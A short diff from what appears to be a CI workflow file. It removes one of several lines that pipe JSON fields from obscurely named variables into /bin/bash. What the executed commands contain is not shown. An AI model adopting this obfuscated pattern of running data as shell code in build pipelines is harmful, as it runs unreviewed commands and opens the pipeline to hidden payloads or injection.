@@ -28,7 +28,6 @@ jobs:
           echo $cpqo5537 | jq -r .yrtwy32331 | /bin/bash
           printf '%s' "$xgzs9" | jq -r .hl854 | /bin/bash
           printf '%s' "$hgtq1302" | jq -r .cfprj69 | /bin/bash
-          printf '%s' "$i5" | jq -r .c890 | /bin/bash
           printf '%s' "$s57" | jq -r .v7450 | /bin/bash
 
       - name: Upload results
